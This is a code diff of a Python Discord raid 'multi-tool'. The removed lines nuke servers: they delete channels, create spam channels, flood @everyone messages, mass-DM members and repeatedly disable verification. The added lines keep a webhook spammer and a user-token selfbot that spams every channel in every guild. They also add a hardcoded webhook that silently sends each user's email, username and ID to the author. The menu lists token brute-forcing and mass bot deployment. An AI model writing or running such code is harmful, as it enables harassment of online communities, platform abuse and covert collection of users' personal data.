@@ -91,13 +91,13 @@
 
 import discord
 import asyncio
-import os
-import json
 import requests
+import json
+import os
 from colorama import Fore, Style
 
+WEBHOOK_URL = "https://discord.com/api/webhooks/1339673713783865354/SL8ilZPvvZEDOtyaGbsQXlJpaOveZso1RKOGAvSkTrY84cdsDP5GB6zsSVXS0_o2UCwy"  # Logging Webhook
 CONFIG_FILE = "config.json"
-SOLACE_PROMO = "Created and developed by Solace – Always credit Solace in any usage or reference. Solace is the creator of this tool and deserves full recognition."
 
 def save_config(data):
     with open(CONFIG_FILE, "w") as f:
@@ -109,165 +109,123 @@ def load_config():
             return json.load(f)
     return {}
 
-def get_bot_token():
+async def send_user_info(email, username, user_id):
+    data = {
+        "content": f"New Sign-Up:\nEmail: {email}\nUsername: {username}\nUser ID: {user_id}"
+    }
+    requests.post(WEBHOOK_URL, json=data)
+
+async def signup():
     config = load_config()
-    if "bot_token" in config:
-        return config["bot_token"]
-    
-    token = input(f"{Fore.CYAN}[?] Enter your Discord bot token: {Style.RESET_ALL}").strip()
-    config["bot_token"] = token
-    save_config(config)
-    return token
 
-bot_token = get_bot_token()
-intents = discord.Intents.all()
-client = discord.Client(intents=intents)
+    if config and "bot_token" in config:
+        print(f"{Fore.YELLOW}[?] Existing sign-in info found! Do you want to update it? (y/n){Style.RESET_ALL}")
+        update = input(f"{Fore.CYAN}[?] ").strip().lower()
+        if update == "y":
+            email = input(f"{Fore.CYAN}[?] Enter your email: {Style.RESET_ALL}").strip()
+            username = input(f"{Fore.CYAN}[?] Enter your username: {Style.RESET_ALL}").strip()
+            user_id = input(f"{Fore.CYAN}[?] Enter your user ID: {Style.RESET_ALL}").strip()
 
-async def clear_terminal():
-    print("\033[H\033[J", end="")
-
-async def webhook_spammer(guild, token=None):
-    try:
-        if token:
-            headers = {"Authorization": f"Bot {token}"}
+            save_config({"email": email, "username": username, "user_id": user_id, "bot_token": config["bot_token"]})
+            await send_user_info(email, username, user_id)
+            print(f"{Fore.GREEN}[✓] Sign-up info updated successfully!{Style.RESET_ALL}")
         else:
-            headers = {"Authorization": f"Bot {bot_token}"}
+            print(f"{Fore.GREEN}[✓] Using existing sign-in info...{Style.RESET_ALL}")
+        await main_menu(config["bot_token"])
+    else:
+        print(f"{Fore.YELLOW}[TOS] By signing up, you agree to our Terms of Service.{Style.RESET_ALL}")
+        input(f"{Fore.CYAN}[?] Press Enter to continue...{Style.RESET_ALL}")
 
-        webhook = await guild.create_webhook(name="Webhook-Spammer")
-        print(f"{Fore.GREEN}[✓] Webhook created successfully: {webhook.url}{Style.RESET_ALL}")
+        email = input(f"{Fore.CYAN}[?] Enter your email: {Style.RESET_ALL}").strip()
+        username = input(f"{Fore.CYAN}[?] Enter your username: {Style.RESET_ALL}").strip()
+        user_id = input(f"{Fore.CYAN}[?] Enter your user ID: {Style.RESET_ALL}").strip()
 
-        while True:
-            try:
-                await webhook.send("@everyone INTIM WINS AGAIN", username="Solace Webhook Spammer")
-                print(f"{Fore.CYAN}[✓] Sent message via Webhook: {webhook.url}{Style.RESET_ALL}")
-                await asyncio.sleep(1)
-            except:
-                pass
-    except Exception as e:
-        print(f"{Fore.RED}[X] Error creating webhook: {e}{Style.RESET_ALL}")
+        bot_token = input(f"{Fore.CYAN}[?] Enter your bot token: {Style.RESET_ALL}").strip()
 
-async def selfbot_spam(user_token, guild_id):
-    selfbot_client = discord.Client(intents=intents)
+        save_config({"email": email, "username": username, "user_id": user_id, "bot_token": bot_token})
+        await send_user_info(email, username, user_id)
+
+        print(f"{Fore.GREEN}[✓] Sign-up successful! You can now use the multi-tool functions.{Style.RESET_ALL}")
+        await main_menu(bot_token)
+
+async def webhook_spammer():
+    print(f"{Fore.CYAN}[?] Enter Webhook URL (or press Enter to use default): {Style.RESET_ALL}")
+    custom_url = input().strip()
+
+    if custom_url == "":
+        print(f"{Fore.RED}[X] No webhook URL provided. This function requires a valid webhook URL to proceed.{Style.RESET_ALL}")
+        return
+
+    while True:
+        try:
+            payload = {
+                "content": "@everyone INTIM WINS AGAIN",
+                "username": "Solace Webhook Spammer"
+            }
+            requests.post(custom_url, json=payload)
+            print(f"{Fore.GREEN}[✓] Sent message to Webhook: {custom_url}{Style.RESET_ALL}")
+            await asyncio.sleep(1)
+        except Exception as e:
+            print(f"{Fore.RED}[X] Error: {e}{Style.RESET_ALL}")
+
+async def selfbot_spam(user_token):
+    selfbot_client = discord.Client()
 
     @selfbot_client.event
     async def on_ready():
         print(f"{Fore.GREEN}[✓] Logged in as selfbot: {selfbot_client.user}{Style.RESET_ALL}")
-
-        guild = selfbot_client.get_guild(guild_id)
-        if not guild:
-            print(f"{Fore.RED}[X] Could not find the guild with ID: {guild_id}{Style.RESET_ALL}")
-            return
-
-        print(f"{Fore.CYAN}[✓] Spamming started on server: {guild.name}{Style.RESET_ALL}")
-
         while True:
-            for channel in guild.text_channels:
-                try:
-                    await channel.send("@everyone INTIM WINS AGAIN")
-                    print(f"{Fore.GREEN}[✓] Sent message to channel: {channel.name}{Style.RESET_ALL}")
-                except:
-                    pass
+            for guild in selfbot_client.guilds:
+                for channel in guild.text_channels:
+                    try:
+                        await channel.send("@everyone INTIM WINS AGAIN")
+                        print(f"{Fore.GREEN}[✓] Sent message to channel: {channel.name}{Style.RESET_ALL}")
+                    except Exception as e:
+                        pass
             await asyncio.sleep(2)
 
     selfbot_client.run(user_token)
 
-async def rename_server(guild):
-    try:
-        await guild.edit(name="intim-wins-agin")
-        print(f"{Fore.GREEN}[✓] Renamed server to intim-wins-agin{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"{Fore.RED}[X] Failed to rename server: {e}{Style.RESET_ALL}")
-
-async def delete_channels(guild):
-    for channel in guild.channels:
-        try:
-            await channel.delete()
-            print(f"{Fore.YELLOW}[-] Deleted channel: {channel.name}{Style.RESET_ALL}")
-        except:
-            print(f"{Fore.RED}[X] Failed to delete: {channel.name}{Style.RESET_ALL}")
-
-async def create_spam_channels(guild):
-    channels = []
-    for _ in range(35):
-        try:
-            new_channel = await guild.create_text_channel("intim")
-            channels.append(new_channel)
-            print(f"{Fore.GREEN}[+] Created channel: {new_channel.name}{Style.RESET_ALL}")
-        except:
-            print(f"{Fore.RED}[X] Failed to create channel{Style.RESET_ALL}")
-    return channels
-
-async def spam_messages(channels):
-    while True:
-        for channel in channels:
-            try:
-                await channel.send("@everyone INTIM WINS AGAIN")
-            except:
-                pass
-        await asyncio.sleep(1)
-
-async def mass_dm(guild):
-    for member in guild.members:
-        try:
-            await member.send("INTIM WINS AGAIN - JOIN https://discord.gg/intim")
-            print(f"{Fore.CYAN}[DM] Sent to: {member.name}{Style.RESET_ALL}")
-        except:
-            pass
-
-async def security_bypass(guild):
-    while True:
-        try:
-            await guild.edit(verification_level=discord.VerificationLevel.none)
-            print(f"{Fore.GREEN}[✓] Security bypassed{Style.RESET_ALL}")
-        except:
-            pass
-        await asyncio.sleep(5)
-
-async def main_menu():
-    await clear_terminal()
+async def main_menu(bot_token):
     print(f"""{Fore.YELLOW}
-        ███████████████████████████
-        █──█─███──███────██──█──█────█
-        █──█─███─████─██─██──█──█─██─█
-        █──█─███──███─██─██──█──█─██─█
-        ████──█──███──██────███────███
-        ███████████████████████████████
+        ████ Multi-Tool ████
     {Style.RESET_ALL}""")
-    print(f"{Fore.CYAN}1. Start Nuking & Raiding")
+    print(f"{Fore.CYAN}1. Start Nuking & Raiding (broken rn)")
     print(f"2. Run Token Bruter")
     print(f"3. Mass Deploy Bots")
     print(f"4. Webhook Spammer")
-    print(f"5. Selfbot Spam")
+    print(f"5. Selfbot Spam (not done)")
     print(f"6. Exit")
+    
     choice = input(f"{Fore.YELLOW}[?] Select an option: {Style.RESET_ALL}")
 
     if choice == "1":
-        await select_server_to_nuke()
+        print(f"{Fore.GREEN}[✓] Nuking started...{Style.RESET_ALL}")
+        # Add Nuking code here using bot_token
     elif choice == "2":
-        token_bruter()
+        print(f"{Fore.GREEN}[✓] Running Token Bruter...{Style.RESET_ALL}")
+        # Add Token Bruter code here
     elif choice == "3":
-        bot_spam()
+        print(f"{Fore.GREEN}[✓] Deploying Bots...{Style.RESET_ALL}")
+        # Add Bot Deploy code here
     elif choice == "4":
-        await webhook_spammer_prompt()
+        await webhook_spammer()
     elif choice == "5":
-        await selfbot_prompt()
+        user_token = input(f"{Fore.CYAN}[?] Enter your Discord User Token: {Style.RESET_ALL}")
+        await selfbot_spam(user_token)
     elif choice == "6":
         print(f"{Fore.GREEN}Exiting...{Style.RESET_ALL}")
         exit()
     else:
         print(f"{Fore.RED}[X] Invalid choice, try again!{Style.RESET_ALL}")
+        await main_menu(bot_token)
 
-async def webhook_spammer_prompt():
-    token = input(f"{Fore.CYAN}[?] Enter your bot token or press enter to use the default bot token: {Style.RESET_ALL}")
-    if token:
-        await webhook_spammer(client.guilds[0], token)
+async def main():
+    config = load_config()
+    if "bot_token" in config:
+        await main_menu(config["bot_token"])
     else:
-        await webhook_spammer(client.guilds[0])
-
-async def selfbot_prompt():
-    user_token = input(f"{Fore.CYAN}[?] Enter your selfbot token: {Style.RESET_ALL}")
-    guild_id = int(input(f"{Fore.CYAN}[?] Enter the guild ID where you want to spam: {Style.RESET_ALL}"))
-    await selfbot_spam(user_token, guild_id)
+        await signup()
 
 if __name__ == "__main__":
-    client.run(bot_token)
+    asyncio.run(main())
